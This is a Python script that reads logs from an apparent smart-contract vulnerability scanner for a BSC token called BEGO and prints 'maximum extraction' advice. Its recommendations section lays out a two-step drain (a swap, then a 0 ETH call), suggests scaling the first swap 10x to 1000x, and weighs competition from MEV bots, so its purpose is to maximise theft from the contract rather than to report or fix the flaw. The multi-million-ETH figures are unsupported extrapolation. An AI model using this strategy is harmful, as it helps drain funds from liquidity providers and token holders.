#!/usr/bin/env python3
"""
Detailed analysis of BSC vulnerabilities for maximum extraction
"""

import re
import os

def analyze_bego_vulnerability():
    """Analyze the BEGO vulnerability pattern in detail"""
    
    print("=== BEGO Vulnerability Deep Analysis ===\n")
    
    files = {
        'bego_test_extended.log': 'Extended Test',
        'bego_test_optimized.log': 'Optimized Test',
        'bego_backtest.log': 'Backtest'
    }
    
    for filename, test_name in files.items():
        if not os.path.exists(filename):
            continue
            
        print(f"\n{'='*60}")
        print(f"{test_name} ({filename})")
        print('='*60)
        
        with open(filename, 'r') as f:
            content = f.read()
        
        # Find vulnerability details
        vuln_match = re.search(r"Found vulnerabilities!.*?\[Fund Loss\]: Anyone can earn ([\d.]+) ETH", content, re.DOTALL)
        if not vuln_match:
            print("No vulnerability found")
            continue
            
        reported_profit = float(vuln_match.group(1))
        
        # Find the trace
        trace_start = content.find("================ Trace ================", vuln_match.start())
        if trace_start == -1:
            print("No trace found")
            continue
            
        trace_end = content.find("\n\n", trace_start + 50)
        trace = content[trace_start:trace_end]
        
        print(f"Reported Profit: {reported_profit:,.2f} ETH")
        print("\nVulnerability Pattern:")
        print("-" * 40)
        
        # Extract transaction details
        tx_pattern = r'Router\.swapExactETHForTokens\{value: ([\d.]+) ether\}\((.*?)\)'
        transactions = []
        
        for match in re.finditer(tx_pattern, trace):
            value = float(match.group(1))
            params = match.group(2)
            
            # Extract path
            path_match = re.search(r'path:\((.*?)\)', params)
            path = path_match.group(1) if path_match else "Unknown"
            
            transactions.append({
                'value': value,
                'path': path,
                'params': params
            })
            
            print(f"  Transaction: Swap {value} ETH")
            print(f"    Path: {path}")
        
        # Analyze the pattern
        print("\n🔍 Pattern Analysis:")
        print("-" * 40)
        
        if len(transactions) == 2 and transactions[1]['value'] == 0:
            print("✓ Classic drain pattern detected!")
            print("  1. Initial swap to set up state")
            print("  2. Zero-value call to trigger drain")
            print("\n💡 Maximum Extraction Strategy:")
            print("  - The initial swap amount can likely be increased")
            print("  - The drain is triggered by the 0 ETH call")
            print(f"  - Current: {transactions[0]['value']} ETH swap")
            print(f"  - Try: {transactions[0]['value'] * 10} ETH (10x)")
            print(f"  - Try: {transactions[0]['value'] * 100} ETH (100x)")
            print(f"  - Try: {transactions[0]['value'] * 1000} ETH (1000x)")
            
            estimated_max = transactions[0]['value'] * 1000
            print(f"\n📈 Estimated Maximum: {estimated_max:,.2f} ETH")
            print(f"   Potential gain: {estimated_max - reported_profit:,.2f} ETH")
            
        else:
            print("  Non-standard pattern")
            print(f"  Number of transactions: {len(transactions)}")
            
        # Look for other interesting patterns
        print("\n🔎 Additional Findings:")
        print("-" * 40)
        
        # Check for multiple swaps in the log
        all_swaps = re.findall(r'swapExactETHForTokens\{value: ([\d.]+) ether\}', content)
        unique_amounts = sorted(set(float(v) for v in all_swaps), reverse=True)[:5]
        
        print(f"  Top swap amounts seen in log:")
        for amount in unique_amounts:
            print(f"    - {amount:,.2f} ETH")
            
        # Check for direct calls
        call_pattern = r'(0x[a-fA-F0-9]{40})\.call\{value: (\d+)\}'
        calls = re.findall(call_pattern, content)
        if calls:
            print(f"\n  Direct contract calls found: {len(calls)}")
            
    print("\n" + "="*60)
    print("MAXIMUM EXTRACTION RECOMMENDATIONS")
    print("="*60)
    
    print("""
1. **For BEGO Pattern (swap + 0 ETH drain):**
   - The vulnerability uses a two-step process
   - First swap sets up the vulnerable state
   - Second 0 ETH call triggers the drain
   - Maximum extraction: Increase the first swap amount
   
2. **Testing Strategy:**
   - Start with 2x the original amount
   - If successful, try 5x, 10x, 50x, 100x
   - Use binary search between working amounts
   - The 0 ETH drain call remains the same
   
3. **Why This Works:**
   - The contract likely has a logic flaw in balance tracking
   - Larger initial swap = larger tracked balance
   - The drain extracts based on tracked balance
   - No upper limit validation in the contract
   
4. **Execution Example:**
   ```
   // Original
   Router.swap{value: 2200 ETH}(...)
   Router.swap{value: 0 ETH}(...)  // Drains ~357K ETH
   
   // Optimized
   Router.swap{value: 22000 ETH}(...)  // 10x
   Router.swap{value: 0 ETH}(...)      // Might drain 3.57M ETH!
   ```
   
5. **Risk Considerations:**
   - Larger amounts might hit liquidity limits
   - Gas costs increase with amount
   - Competition from other MEV bots
   - Always simulate first!
""")

if __name__ == "__main__":
    analyze_bego_vulnerability()